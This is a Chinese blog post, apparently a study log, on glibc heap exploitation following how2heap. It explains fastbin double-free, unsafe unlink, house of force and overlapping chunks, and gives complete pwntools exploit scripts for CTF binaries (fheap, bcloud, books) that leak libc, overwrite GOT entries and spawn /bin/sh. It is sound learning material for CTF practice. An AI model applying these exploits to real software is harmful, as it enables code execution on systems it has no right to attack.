---
title: how2heap
tags:
  - PWN
  - heap
categories: []
date: 2017-03-28 17:45:10
---

## 0x00

堆溢出搞了很久，道理我都懂，但是就是在实战中用不起来，只能花功夫一定要在这周把堆溢出啃下来。
以[how2heap](https://github.com/shellphish/how2heap)为学习路径，step by step，记录下，可能的话，帮助到后来的人。

> | File | Technique | Applicable CTF Challenges |
|------|-----------|---------------------------|
| [first_fit.c](first_fit.c) | 演示glibc malloc的首次适应(first-fit)行为 | |
| [fastbin_dup.c](fastbin_dup.c) | 通过操作fastbin已释放的表，来除法malloc以返回已经分配过的堆指针| |
| [fastbin_dup_into_stack.c](fastbin_dup_into_stack.c) | 通过操作fastbin的已释放的表，来触发malloc来得到一个几乎任意指向的指针 | [9447-search-engine](https://github.com/ctfs/write-ups-2015/tree/master/9447-ctf-2015/exploitation/search-engine) |
| [unsafe_unlink.c](unsafe_unlink.c) | Exploiting free on a corrupted chunk to get arbitrary write. | [HITCON CTF 2014-stkof](http://acez.re/ctf-writeup-hitcon-ctf-2014-stkof-or-modern-heap-overflow/) |
| [house_of_spirit.c](house_of_spirit.c) | Frees a fake fastbin chunk to get malloc to return a nearly-arbitrary pointer. | [hack.lu CTF 2014-OREO](https://github.com/ctfs/write-ups-2014/tree/master/hack-lu-ctf-2014/oreo) |
| [poison_null_byte.c](poison_null_byte.c) | Exploiting a single null byte overflow. | [PlaidCTF 2015-plaiddb](https://github.com/ctfs/write-ups-2015/tree/master/plaidctf-2015/pwnable/plaiddb) |
| [house_of_lore.c](house_of_lore.c) | Tricking malloc into returning a nearly-arbitrary pointer by abusing the smallbin freelist. | |
| [overlapping_chunks.c](overlapping_chunks.c) | 利用覆写已释放在unsortbin链中chunk的size位，去获得一个重叠在已分配chunk的新的分配 | [hack.lu CTF 2015-bookstore](https://github.com/ctfs/write-ups-2015/tree/master/hack-lu-ctf-2015/exploiting/bookstore) |
| [house_of_force.c](house_of_force.c) | 溢出Top chunk头去分配，来得到一个接近任意地址的指针 | [Boston Key Party 2016-cookbook](https://github.com/ctfs/write-ups-2016/tree/master/boston-key-party-2016/pwn/cookbook-6), [BCTF 2016-bcloud](https://github.com/ctfs/write-ups-2016/tree/master/bctf-2016/exploit/bcloud-200) |
| [unsorted_bin_attack.c](unsorted_bin_attack.c) | 利用在unsortbin的freelist链表里的一个已释放chunk的overwrite去在任意地址中写入一个大数 | [0ctf 2016-zerostorage](https://github.com/ctfs/write-ups-2016/tree/master/0ctf-2016/exploit/zerostorage-6) |
| [house_of_einherjar.c](house_of_einherjar.c) | Exploiting a single null byte overflow to trick malloc into returning a controlled pointer  | [Seccon 2016-tinypad](https://gist.github.com/hhc0null/4424a2a19a60c7f44e543e32190aaabf) |

<!--more-->
## 0x01 first fit

这里主要提供了一个UAF的使用示例。glibc使用的first-fit算法来选择空间分配，当我们之前释放的chunk足够大时，程序就会最先使用这个chunk。但此时释放的上一个使用此chunk的指针依然指向这个chunk，我们可以通过一个已经free过的指针来控制这个chunk。

## 0x02 fastbin dup

fastbin通过一个链表来维护空闲的chunk，当一个chunk被free掉之后，会将这个chunk接回链表的头部，下次申请时会申请这个chunk。

## 0x03 fastbin dup into stack(double-free)

这个就是double-free的一个利用。
当我们`malloc`一个小于`128`的堆块的时候，`ptmalloc`就会调用到`fastbin`。`fastbin`是由一个单链表组成的，遵循`FIFO`原则，由于`fastbin`在`free`的时候并不会对指针是否已经释放做检查，所以我们可以构造出一个循环链表的情况。
比如：

```
int *a = malloc(8) ;
int *b = malloc(8);
free(a);
free(b);
```
此时维护的一个链表结构为
`[head] -> b -> a -> null`

当我们再次

`free(a);`

此时的链表结构为

`[head] -> a -> b -> a -> null`

紧接着我们申请两次堆

```
*a = malloc(8);
*b = malloc(8);
```

此时我们维护的链表结构为

`[head] -> a -> null`

如果我们修改`a`的前八个字节为我们的希望的地址，当我们两次`malloc`之后，我们就能得到一个指向任意地址的指针。

```
*a = &attribute_addr;
int *c = malloc(8);   //c == a
int *d = malloc(8);   // d == attribute_addr
```

维护的链表如下

```
[head] -> a -> null
[head] -> a -> attribute
[head] -> attribute
```

于是我们就可以得到一个`8bit`的任意地址写了。

以下用_2016hctf_的`就是干`为例

#### 例题

首先分析程序，先查看程序的保护

```
ubuntu@VM-250-199-ubuntu:~/ctf-problem/2016hctf/pwn/fheap$ checksec pwn-f 
[*] '/home/ubuntu/ctf-problem/2016hctf/pwn/fheap/pwn-f'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

由于程序打开的PIE，我们在gdb调试的时候很不方便，gdb默认是关闭`aslr`的，但是它会给程序加上一个默认的基地址`0x555555554000`

这个程序有两个功能：

1. 添加字符串
2. 删除一个字符串

其中，存储字符串的结构题如下：

```
00000000 info            struc ; (sizeof=0x20, mappedto_1)
00000000 content         db 16 dup(?)            ; string(C)
00000010 size            dq ?
00000018 DestroyFunc      dq ?                    ; 这里是程序的调用的free函数的地址
00000020 info            ends

struct info{
	char cintent[16];
    int size;
    void* DestroyFunc;
};
```

当我们申请小于15字节的长度时，字符串会直接保存在`info.content`中。当我们申请长度大于15的字符串的时候，程序会另外申请一个字符串大小的堆，同时这个堆的地址保存在原本的`info.content`中

```
    if ( nbytesa > 15 )
    {
      dest = (char *)malloc(nbytesa);
      if ( !dest )
      {
        puts("malloc faild!");
        exit(1);
      }
      strncpy(dest, &buf, nbytesa);
      *(_QWORD *)ptr = dest;
      *((_QWORD *)ptr + 3) = sub_D6C;           // free(*content)
                                                // free(content)
    }
    else
    {
      strncpy(ptr, &buf, nbytesa);
      *((_QWORD *)ptr + 3) = sub_D52;           // free(content)
    }
```

小于15时堆内存分布
```
pwndbg> x/6xg 0x555555757000
0x555555757000:	0x0000000000000000	0x0000000000000031
0x555555757010:	0x0000000061616161	0x0000000000000000           // content
0x555555757020:	0x0000000000000004	0x0000555555554d52           // size + DestroyFunc
```

大于15时堆内存的分布情况
```
pwndbg> x/6xg 0x555555757060
0x555555757060:	0x0000000000000000	0x0000000000000021
0x555555757070:	0x6161616161616161	0x6262626262626161           // content
0x555555757080:	0x000000000a626262	0x0000000000020f81
pwndbg> x/6xg 0x555555757030
0x555555757030:	0x0000000000000000	0x0000000000000031
0x555555757040:	0x0000555555757070	0x0000000000000000          // new malloc addr
0x555555757050:	0x0000000000000014	0x0000555555554d6c          // size +  DestroyFunc
```

再来看一下全局变量的堆管理情况

```
pwndbg> telescope 0x555555554000+0x2020C0
00:0000│   0x5555557560c0 (__bss_start+32) ◂— 0x1
01:0008│   0x5555557560c8 (__bss_start+40) —▸ 0x555555757010 ◂— 0x61616161 /* 'aaaa' */
02:0010│   0x5555557560d0 (__bss_start+48) ◂— 0x1
03:0018│   0x5555557560d8 (__bss_start+56) —▸ 0x555555757040 —▸ 0x555555757070 ◂— 'aaaaaaaaaabbbbb...'
04:0020│   0x5555557560e0 (__bss_start+64) ◂— 0x1
05:0028│   0x5555557560e8 (__bss_start+72) —▸ 0x555555757090 —▸ 0x5555557570c0 ◂— 'ccc\naaaaaabbbbb...'
06:0030│   0x5555557560f0 (__bss_start+80) ◂— 0x0
... ↓
pwndbg> x/6xg 0x555555554000+0x2020C0
0x5555557560c0:	0x0000000000000001	0x0000555555757010
0x5555557560d0:	0x0000000000000001	0x0000555555757040
0x5555557560e0:	0x0000000000000001	0x0000555555757090
```
堆管理结构中，前一个为表示是否占用，后一个表示字符串的地址。

看一下删除操作的函数实现：
```
if ( *((_QWORD *)&manage + 2 * v1 + 1) )
  {
    printf("Are you sure?:");
    read(0, &buf, 0x100uLL);
    if ( !strncmp(&buf, "yes", 3uLL) )
    {
      (*(void (__fastcall **)(_QWORD, const char *))(*((_QWORD *)&manage + 2 * v1 + 1) + 24LL))(
        *((_QWORD *)&manage + 2 * v1 + 1),
        "yes");
      *((_DWORD *)&manage + 4 * v1) = 0;
    }
  }
```

官方的源码如下：
```
void deleteStr() {
    int id;
	char buf[0x100];
    printf("Pls give me the string id you want to delete\nid:");
    id = getInt();
    if (id < 0 || id > 0x10) {
        printf("Invalid id\n");
    }
    if (Strings[id].str) {
		printf("Are you sure?:");
		read(STDIN_FILENO,buf,0x100);
		if(strncmp(buf,"yes",3)) {
			return;
		}
        Strings[id].str->free(Strings[id].str);
        Strings[id].inuse = 0;
    }
}
```

这里存在一个漏洞，程序检查的是字符串的结构体指针是否为0，但事实上是不可能为0的。同时利用`fastbin`不会检查是否已释放的特点，我们可以构造`double-free`那么我们就可以利用这一点，如果在结构体调用的`DestroyFunc`覆盖为其他函数，我们就可以造成任意函数执行。如果我们将堆上的函数覆盖位`puts`时，程序将会执行`puts(contents)`而不是`free(content)`，通过适当`content`，我们可以泄露程序基址。
在结构体的`DestroyFunc`部分，即使开了`PIE`，程序的最后三位也是不变的，我们只需要覆盖最后3位或2位即可。

所以总结，此题的漏洞点在`UAF`&`double-free`。
ecp:

```
#! /usr/bin/python
from pwn import *

context.log_level = 'debug'
target = process('pwn-f')

def create(size, string):
    target.recvuntil('quit')
    target.sendline('create ')
    target.recvuntil('size:')
    target.sendline(str(size))
    target.recvuntil('str:')
    target.send(string)


def delete(id):
    target.recvuntil('quit')
    target.sendline('delete ')
    target.recvuntil('id:')
    target.sendline(str(id))
    target.recvuntil('sure?:')
    target.sendline('yes')

create(4, 'aaa\n')
create(4, 'aaa\n')
delete(0)
delete(1)
delete(0)
create(4, '\x00')
create(0x20, 'a' * 0x16 + 'lo' + '\x2d\x00')
delete(0)

target.recvuntil('lo')
addr = target.recvline()
addr = addr[:-1]
addr = u64(addr + '\x00' * (8 - len(addr))) - 0xd2d

delete(1)

create(4, '\x00')

target.recvuntil('quit')
target.sendline('create ')
target.recvuntil('size:')
target.sendline(str(0x20))
target.recvuntil('str:')
target.send('a' * 0x18 + p64(0x00000000000011DC + addr))

print hex(addr)

target.recvuntil('quit')
target.sendline('delete ')
target.recvuntil('id:')
target.sendline('1')
target.recvuntil('sure?:')

ropchain = p64(addr + 0x00000000000011e3)   # pop rdi
ropchain += p64(addr + 0x202070)            # got@malloc
ropchain += p64(addr + 0x0000000000000990)  # plt@put

ropchain += p64(addr + 0x00000000000011e3)  # pop rdi
ropchain += p64(1)
ropchain += p64(addr + 0x00000000000011DA)  # magic
ropchain += p64(0)                          # rbx
ropchain += p64(1)                          # rbp
ropchain += p64(addr + 0x0000000000202058)  # r12 -> rip got@read
ropchain += p64(8)                          # r13 -> rdx
ropchain += p64(addr + 0x0000000000202078)  # r14 -> rsi got@atoi
ropchain += p64(0)                          # r15 -> rdi
ropchain += p64(addr + 0x00000000000011C0)  # magic
ropchain += 'a'*8*7

ropchain += p64(addr + 0x0000000000000B65)  # getInt

target.sendline('yes     ' + ropchain)
addr = target.recvline()[:-1]
addr = u64(addr + '\x00' * (8 - len(addr)))
#addr = addr - 534112 + 288144
addr = addr - 537984 + 283536
print hex(addr)
target.sendline(p64(addr)+'/bin/sh')
target.interactive()
```

另外一种方法，更简单，[参考链接](https://cartermgj.github.io/2016/12/01/Hctf-jiushigan/)

```
from pwn import *

context.log_level = 'debug'
global io
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
elf = ELF('./pwn-f')

def create_list(io,length,strr):
	io.recvuntil('quit')
	io.sendline('create ')
	io.recvuntil('Pls give string size:')
	io.sendline(length)
	io.recvuntil('str:')
	io.sendline(strr)

def delete_list(io,number):
	io.recvuntil('quit')
	io.sendline('delete ')
	io.recvuntil('id:')
	io.sendline(number)
	io.recvuntil('Are you sure?:')
	io.sendline('yes')


def pwn():
	global io

	debug = 1
	if debug:
   	 	io = process('./pwn-f')
	else:
		#io = remote('127.0.0.1',2333)
		io = remote('115.28.78.54',80)
		io.recvuntil('please input you token: ')
		io.sendline('b66888c818c08d932ea91b8d6a1f122c2y7ZAdbh')
#------------------------------------------------use fsb to leak __libc_start_main's address
	create_list(io,'10','aaaa')
	create_list(io,'10','bbbb')
	create_list(io,'10','cccc')
	delete_list(io,'0')
	delete_list(io,'1')
	delete_list(io,'2')
	content1 = "%175$p".ljust(24,'a')+'\xd0\xf9\x00'
	create_list(io,'29',content1)
	delete_list(io,'1')                     #-----printf('%113$p')

	data = io.recv(14)
	libc_start_main = int(data,16)-240
	print "libc_start_main_addr="+hex(libc_start_main)
#--------------------------------------------------caculate system_addr	
	libc_start_main_offset = libc.symbols['__libc_start_main']
	system_addr = libc.symbols['system']
	system_addr = libc_start_main  - libc_start_main_offset + system_addr
	print "system_addr=" + hex(system_addr)

	create_list(io,'10','zzzz\x00')

	create_list(io,'10','aaaa\x00')
	create_list(io,'10','bbbb\x00')
	create_list(io,'10','cccc\x00')
	delete_list(io,'2')
	delete_list(io,'3')
	delete_list(io,'4')
#----------can't have '\x00' in string.because len(string) must >15.And after '/bin/sh' must have a space.
	content2 = "/bin/sh #".ljust(24,'a')+ p64(system_addr)  
	create_list(io,'32',content2)
	delete_list(io,'3')                     #system('/bin/sh')
	
	io.sendline('uname -a')
	io.interactive()



if __name__ == '__main__':
	while True:
		try:
			pwn()
		except EOFError:
			print 'guess not success!!!'
			io.close()
			time.sleep(0.5)
```

## 0x04 unsafe unlink

这里的unlink分为两种，一个释放堆块的相邻堆块共有两个，当**前一个堆块**空闲时，**向后合并**；当**后一个堆块**空闲时，**向前合并**。

glibc的unlink宏（简化版）：
```
FD = P->fd;
BK = P->bk;
if(FD->bk == P && BK->fd == P)
{
	FD->bk = P;
	BK->fd = P;
}
```

当我们存在向后合并的情况时：
```
/*
| chunk1(p1) | chunk2(p2) |
*/
#include <stdio.h>

void *ptr;

int main()
{
	int prev_size, size, fd, bk;
	void *p1, *p2;
	char buf[253] = "";

	p1 = malloc(252);
	p2 = malloc(252);

	ptr = p1;
	prev_size = 0;
	size = 249;
	fd = (int)(&ptr) - 0xc;
	bk = (int)(&ptr) - 0x8;

	memset(buf, 'c', 253);
	memcpy(buf, &prev_size, 4);
	memcpy(buf+4, &size, 4);
	memcpy(buf+8, &fd, 4);
	memcpy(buf+12, &bk, 4);
	size = 248;
	memcpy(&buf[248], &size, 4);
	buf[252] = '\x00';

	memcpy(p1, buf, 253);
	free(p2);
	return 0;
}
```
此时我们free掉p2的话，由于我们伪造了chunk2的pre_presize和pre_inuse位，会使得向后合并的情况发生，fake_chunk会向后融合。再来观察unlink宏
```
/*P为fake_chunk，由chunk2->pre_size得到
P == ptr;
*/
FD = P->fd;                     // FD = P->fd = &ptr - 0xc = *(ptr + 0x8)
BK = P->bk;                    // BK = P->bk = &ptr - 0x8 = *(ptr + 0xc)
if(FD->bk == P && BK->fd == P)
/*
	此时
    FD->bk = ptr = *(&ptr - 0xc + 0xc)
    BK->fd = ptr = *(&ptr - 0x8 + 0x8)
    绕过检查
*/
{
	FD->bk = BK;                // FD->bk = &ptr - 0x8; ptr == &ptr - 0x8;
	BK->fd = FD;                 // BK->fd = &ptr - 0xc; ptr == &ptr - 0xc;
}
/*
最后ptr = &ptr - 0xc
*/
```

## 0x05 house of spirit

## 0x09 house of force

我们知道os中存在一个top chunk用来在分配堆块，当我们的bins中不存在合适的堆块时，从top chunk中来切割出合适大小的堆块已分配给用户。

这里我们来看`how2heap`中给出的demo

首先我们定义一个全局变量`bss_var`，值为`This is a string that we want to overwrite.`

我们查看下他的地址为`0x602060`
```
pwndbg> p &bss_var 
$3 = (char (*)[44]) 0x602060 <bss_var>
```

然后我们分配一个大小256堆块，地址为`0x7fffffffdec8`
```
pwndbg> p &p1
$4 = (intptr_t **) 0x7fffffffdec8
```
由于已使用中的chunk要加上8byte的`prev_size`和8byte的`size`

所以真实的chunk的起始地址为`0x603410`
此时我们查看堆的地址如下
```
pwndbg> heap 
Top Chunk: 0x603520
Last Remainder: 0

0x603000 PREV_INUSE {
  prev_size = 0, 
  size = 1041, 
  fd = 0x20706f7420656854, 
  bk = 0x7473206b6e756863, 
  fd_nextsize = 0x2074612073747261, 
  bk_nextsize = 0x3832353330367830
}
0x603410 PREV_INUSE {
  prev_size = 0, 
  size = 273, 
  fd = 0x0, 
  bk = 0x0, 
  fd_nextsize = 0x0, 
  bk_nextsize = 0x0
}
0x603520 PREV_INUSE {
  prev_size = 0, 
  size = 133857, 
  fd = 0x0, 
  bk = 0x0, 
  fd_nextsize = 0x0, 
  bk_nextsize = 0x0
}
```
此时原先的top chunk的大小为`133857-1`(1为flag位)

我们修改top chunk的size为`-1`(`0xffffffffffffffff`)
此时，top chunk的大小为
```
0x603520 {
  prev_size = 0, 
  size = 0, 
  fd = 0xffffffffffffffff, 
  bk = 0x0, 
  fd_nextsize = 0x0, 
  bk_nextsize = 0x0
}
```
然后我们分配一个正好在我们欲修改位置毗邻的大小的堆块，这样我们在再下一次malloc时我们就可以分配到想要的位置了

我们分配的大小为`unsigned long evil_size = (unsigned long)bss_var - sizeof(long)*3 - (unsigned long)ptr_top;`
也就是`0xffffffffffffeb28`，得到这样一个大数以实现堆的反向分配

此时我们再分配就得到了`bbs_var`了，我们可以对`bbs_var`做读写操作了

#### 例题

2017zctf的dragon和2016bctf的bclould

先看2016bctf这题
在输入姓名时存在有漏洞的截断，当我们输入`i`个字符时，是在第`i+1`的位置添加`\x00`然而，但是我们后面看到的地址的赋值操作时，会把`\x00`给覆盖掉，当我们`strcpy`时，就会把堆指针给copy进去。

```
int sub_80487A1()
{
  char buffer; // [sp+1Ch] [bp-5Ch]@1
  char *_name; // [sp+5Ch] [bp-1Ch]@1
  int v5; // [sp+6Ch] [bp-Ch]@1

  v5 = *MK_FP(__GS__, 20);
  memset(&buffer, 0, 80u);
  puts("Input your name:");
  read_buf((int)&buffer, 64, 10);
  _name = (char *)malloc(64u);
  name_addr = (int)_name;                                     //这里存在将'\x00'覆盖的情况
  strcpy(_name, &buffer);
  sub_8048779((int)_name);
  return *MK_FP(__GS__, 20) ^ v5;
}
```

```
pwndbg> telescope 0x915d008 20
00:0000│ eax  0x915d008 ◂— 0x61616161 ('aaaa')
... ↓
0f:003c│      0x915d044 ◂— 0x62616161 ('aaab')
10:0040│      0x915d048 —▸ 0x915d008 ◂— 0x61616161 ('aaaa')
11:0044│ edx  0x915d04c ◂— 0x20f00
12:0048│      0x915d050 ◂— 0x0
```
这里我们能看到输出的是`name_addr`这个指针的值。

接下来的`org`和`host`的copy其实也存在这个漏洞。
```
int sub_804884E()
{
  char org; // [sp+1Ch] [bp-9Ch]@1
  char *_org; // [sp+5Ch] [bp-5Ch]@1
  int host; // [sp+60h] [bp-58h]@1
  char *_host; // [sp+A4h] [bp-14h]@1
  int v5; // [sp+ACh] [bp-Ch]@1

  v5 = *MK_FP(__GS__, 20);
  memset(&org, 0, 0x90u);
  puts("Org:");
  read_buf((int)&org, 64, 10);
  puts("Host:");
  read_buf((int)&host, 64, 10);
  _host = (char *)malloc(64u);
  _org = (char *)malloc(64u);
  org_addr = (int)_org;
  host_addr = (int)_host;
  strcpy(_host, (const char *)&host);
  strcpy(_org, &org);
  puts("OKay! Enjoy:)");
  return *MK_FP(__GS__, 20) ^ v5;
}
```
好吧，其实这里还是细心才能看到的漏洞，我们发现`strcpy(_org, &org);`这里其实是会把`org+_org+host`的数据全部copy到堆上，实事上我们可以调试发现，`host`的数据正好覆盖了top chunk的size，也就是`wildness`，这里我们修改为`0xffffffff`

覆盖前：
```
0x945a098:	0x00000000	0x00000000	0x00000000	0x00000000
0x945a0a8:	0x00000000	0x00000000	0x00000000	0x00000000
0x945a0b8:	0x00000000	0x00000000	0x00000000	0x00000000
0x945a0c8:	0x00000000	0x00000000	0x00000000	0x00000000
0x945a0d8:	0x00000000	0x00020e71	0x00000000	0x00000000
0x945a0e8:	0x00000000	0x00000000	0x00000000	0x00000000
```
覆盖后：
```
pwndbg> x/40wx 0x945a098
0x945a098:	0x61616161	0x61616161	0x61616161	0x61616161
0x945a0a8:	0x61616161	0x61616161	0x61616161	0x61616161
0x945a0b8:	0x61616161	0x61616161	0x61616161	0x61616161
0x945a0c8:	0x61616161	0x61616161	0x61616161	0x61616161
0x945a0d8:	0x0945a098	0xffffffff	0x00000000	0x00000000
0x945a0e8:	0x00000000	0x00000000	0x00000000	0x00000000
```
我们发现`0x945a0d8`这行的值被修改为我们想要的`0xffffffff`了。

这题能够通过`house of force`来解决。

我实现的步骤：
1. leak name_addr 的堆地址，并通过计算得到top chunk的地址
2. 修改wildness为`0xffffffff(-1)`
3. 分配一个大小为`wanted_addr - top_chunk_addr`堆块， 此时再分配得到的堆块即在`wanted_addr`地址上，我们就可以操纵这里的数据了
4. 修改此处的堆块数据，覆盖`content_addr[]`为`free_got, read_got, atoi_got`
5. `edit()`id0的结构，修改`free_got`为`printf`
6. `delete()`id1，泄露`read`的地址
7. `edit()`id2， 修改`atoi`为`system`
8. getshell

```
#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

context(log_level = 'critical')

p = process('./bcloud')
elf = ELF('./bcloud')
libc = ELF('/lib32/libc.so.6')

atoi_got = elf.got['atoi']
read_got = elf.got['read']
free_got = elf.got['free']
printf_plt = elf.plt['printf']

bss = 0x0804B060
content_length = 0x0804b0a0
content_addr = 0x804B120

def new(length, content):
    p.recvuntil('>>\n')
    p.sendline('1')
    p.recvuntil('content:\n')
    p.sendline(str(length))
    p.recvuntil('content:\n')
    p.sendline(content)

def edit(index, content):
    p.recvuntil('>>\n')
    p.sendline('3')
    p.recvuntil('id:\n')
    p.sendline(str(index))
    p.recvuntil('content:\n')
    p.sendline(content)
    p.recvuntil('success.\n')

def leak_overwrite_wildness():
    p.recvuntil('name:\n')
#   raw_input()
    p.send('a' * (0x40 - 1) + 'b')
    p.recvuntil('b')
    addr = p.recv(4)
    p.recvline()
    p.recvuntil('Org:\n')
    p.send('a' * 0x40)
    p.recvuntil('Host:\n')
    p.sendline('\xff\xff\xff\xff')
    return u32(addr)

def main():
#   leak name_heap_addr 
    name_heap_addr = leak_overwrite_wildness()
    print 'name_heap => ', hex(name_heap_addr - 0x08)
    base_heap = name_heap_addr + 0xd0
    print 'base_heap => ', hex(base_heap)

#   malloc a gabage chunk to bss
    offset = bss - base_heap + 0x30
    print 'offset => ', offset
    new(offset, 'abcdabcd') # id0

#   malloc a chunk on bss of free and overwrite content_length[] & content_addr[]
    payload = ''
    payload += p32(4)
    payload += p32(4)
    payload += p32(4)
    payload += (content_addr - content_length - len(payload)) * '\x00'
    payload += p32(free_got)  # id0
    payload += p32(read_got)  # id1
    payload += p32(atoi_got)  # id2
    new('168', payload)

#   overwrite free_got with printf_plt
    edit(0, p32(printf_plt))

#   '4.Delete' to printf libc to get system_addr
    p.recvuntil('>>\n')
    p.sendline('4')
    p.recvuntil('id:\n')
    p.sendline(str(1))
    read_addr = u32(p.recv(4))
    print 'read_addr => ', read_addr

#   modify atoi to system
    libc.address = read_addr - libc.symbols['read']
    system_addr = libc.symbols['system']
    payload2 = p32(system_addr)
    edit(2, payload2)

#   getshell
    p.recvuntil('>>\n')
    p.sendline('/bin/sh\n')
    p.interactive()

if __name__ == '__main__':
    main()
```

## 0x09 overlapping chunks

除了how2heap上演示的extend freed chunks，参考了这篇[文章](http://blog.dazzlepppp.cn/2016/10/15/Producing-Overlapping-Chunks/)后面的内容。

堆块重叠指两块不同的堆块存在重叠部分，以至于我们写任意一块时也会覆写到另一块堆块中。
how2heap给出的演示程序中的意思是，当我们修改了一个已经被free了的chunk的size时，我们再次分配就可以得到一个修改后size的堆块，然后就可以构成堆块重叠，修改当前堆块将会修改到后一个堆块。

查阅资料的过程中发现还可以在free之前修改size的大小，但是实际测试会发现在free的时候会崩溃，暂时没有找到原因。

以how2heap例题2015hack.lu的books为例。

存在明显的堆溢出，程序逻辑如下
```
signed __int64 __fastcall main(__int64 a1, char **a2, char **a3)
{
  signed __int64 result; // rax@4
  __int64 v4; // rcx@16
  signed int v5; // [sp+4h] [bp-BCh]@5
  void *final_str; // [sp+8h] [bp-B8h]@0
  void *order1; // [sp+18h] [bp-A8h]@1
  void *order2; // [sp+20h] [bp-A0h]@1
  char *dest; // [sp+28h] [bp-98h]@1
  char s; // [sp+30h] [bp-90h]@6
  __int64 v11; // [sp+B8h] [bp-8h]@1

  v11 = *MK_FP(__FS__, 40LL);
  order1 = malloc(0x80uLL);
  order2 = malloc(0x80uLL);
  dest = (char *)malloc(0x80uLL);
  if ( order1 && order2 && dest )
  {
    v5 = 0;
    puts(" Crappiest and most expensive books for your college education!\n\nWe can order books for you in case they're not in stock.\nMax. two orders allowed!\n");
    while (
    {
      if ( v5 )
      {
        printf("%s", final_str);
        printf(dest);                           // fsb
        result = 0LL;
        goto finish;
      }
      puts("1: Edit order 1");
      puts("2: Edit order 2");
      puts("3: Delete order 1");
      puts("4: Delete order 2");
      puts("5: Submit");
      fgets(&s, 128, stdin);
      switch ( s )
      {
        case '1':
          puts("Enter first order:");
          edit((__int64)order1);
          strcpy(dest, "Your order is submitted!\n");
          continue;
        case '2':
          puts("Enter second order:");
          edit((__int64)order2);
          strcpy(dest, "Your order is submitted!\n");
          continue;
        case '3':
          delete(order1);
          continue;
        case '4':
          delete(order2);
          continue;
        case '5':
          final_str = malloc(0x140uLL);
          if ( !final_str )
          {
            fwrite("Something failed!\n", 1uLL, 0x12uLL, stderr);
            result = 1LL;
            goto finish;
          }
          submit((__int64)final_str, (const char *)order1, (char *)order2);
          v5 = 1;
          break;
        default:
          continue;
      }
    }
  }
  fwrite("Something failed!\n", 1uLL, 0x12uLL, stderr);
  result = 1LL;
finish:
  v4 = *MK_FP(__FS__, 40LL) ^ v11;
  return result;
}
```

我们发现在`submit`函数这里存在溢出，我们通过修改已经free的chunk2的size为0x151这样在我们malloc是就会得到这款内存，进而在`submit`函数中溢出`dest`，利用格式化字符串。

但是还有一个问题，我们在格式化字符串之后没有再call任何函数，所以我们通过修改`.fini`section为`main`的地址，以再结束后再次运行到`main`，关于`.fini`的作用在[这篇](http://l4u-00.jinr.ru/usoft/WWW/www_debian.org/Documentation/elf/node3.html)中提到了

> .fini
This section holds executable instructions that contribute to the process termination code. That is, when a program exits normally, the system arranges to execute the code in this section.
.init
This section holds executable instructions that contribute to the process initialization code. That is, when a program starts to run the system arranges to execute the code in this section before the main program entry point (called main in C programs).

总结来说，.fini是程序结束时的全局析构函数的地址，我们可以通过修改这个来得到控制流。

在程序刚开始的时候就malloc了三个连续的chunk，我们可以随意溢出，但是后面接着的`strcpy`会截断我们的溢出，以至于格式化字符串不能利用，于是我们只能利用`submit`这个还能输里面的`strcat`来溢出`dest`里的字符串来得到格式化字符串。

所以思路如下：
1. free掉chunk2
2. 溢出chunk1将chunk2修改为0x151，这样我们在submit的时候就会分配到这个位置
3. submit溢出dest，利用格式化字符串修改free的低2位（其中1位需要猜，1/16概率），同时修改`.fini`为程序开始
4. 传入/bin/sh，得到shell

由于我们只能控制eip两次，所以不能有泄露的步骤了，下面的exp是有泄露的步骤的，没有成功
```
#!/usr/bin/env python
# coding=utf-8
from pwn import *

slog = 1 
local = 1
debug = 0

global p
context(arch='amd64')

if slog: context(log_level = 'debug')
if local:
    p = process('./books')
    libc =  ELF('/lib/x86_64-linux-gnu/libc.so.6')
else:
    p = remote()

if local and debug:
    gdb.attach(p, open('debug'))

elf = ELF('./books')
free_got = elf.got['free']

def edit1(payload):
    p.recvuntil('Submit\n')
    p.sendline('1')
    p.recvuntil('order:\n')
    p.sendline(payload)

def edit2(payload):
    p.recvuntil('Submit\n')
    p.sendline('2')
    p.recvuntil('order:\n')
    p.sendline(payload)

def dele(index):
    p.recvuntil('Submit\n')
    p.sendline(str(index + 2))

def submit():
    p.recvuntil('Submit\n')
    p.sendline('5')

def pwn():
    dele(2)
    payload = '%1908x' + '%13$hn' # 400a39
    payload += '%31$lx'
    payload = payload.ljust(0x80)
    payload += p64(0) + p64(0x151)
    edit1(payload)
    p.recvuntil('Submit\n')
    payload = '5'.ljust(8, '\x00') + p64(0x6011f0)
#    payload += '%{}x'.format(39 - len(payload)) + '%13$hhn'
    gdb.attach(p)
    p.sendline(payload)
    print p.recvline()
    print p.recvline()
    print p.recvline()
    print p.recvuntil('400fda')
    leak_addr = int(p.recv(12), 16)
    print 'leak_addr => ', hex(leak_addr)
    libc.address = leak_addr - 241 - libc.symbols['__libc_start_main']
    print 'libc.address => ', hex(libc.address)
    system_addr = libc.symbols['system']
    print 'system_addr => ', hex(system_addr)

    dele(2)
    low_bytes = int(hex(system_addr)[-4:], 16)
    mid_bytes = int(hex(system_addr)[8:10], 16)
    payload = '%{}x'.format(int(hex(system_addr)[8:10], 16) - 12) + '%13$hhn'
    payload += '%{}x'.format(low_bytes - mid_bytes) + '%14$hn'
    payload = payload.ljust(0x80)
    payload += p64(0) + p64(0x151)
#    gdb.attach(p)
    edit1(payload)
    p.recvuntil('Submit\n')
    payload = '5'.ljust(8, '\x00') + p64(free_got+2)
    payload += p64(free_got)
    p.sendline(payload)

if __name__ == '__main__':
    pwn()
    p.interactive()
```

## 0x0A unsorted bin attack

这个应该是最简单的堆溢出技术了吧，先看当我们释放`unsortbin`时的源码

```
bck = victim->bk;
.........
/* remove from unsorted list */
unsorted_chunks (av)->bk = bck;
bck->fd = unsorted_chunks (av);
```
并没有使用`unlink`宏，所以这里不存在检查指针的情况，如果我们修改了`victim->bk`的值为`fake_addr`，那么`(av)->bk`也会被修改，同时`fake_addr+16 = victim->bk->fd = (av)`，我们就将一个大的数字写到了`fack_addr+16`的位置去。但是由于`(av)->bk`被破坏了，所以下次再走到这步时可能会出错，具体什么操作出现什么问题还待研究。

这个看似任意地址写但是不能控制写的内容，所以只能作为其他攻击的准备。how2heap给出的方法时修改`global_max_fast`，这样我们在剩下分配其他内存时都会以`fastbin`的方式分配，为`fastbin`攻击做准备。

### 例题

这里用给出的20160ctf的ZeroStorage为例
Orz我去这程序怎么这么长。。。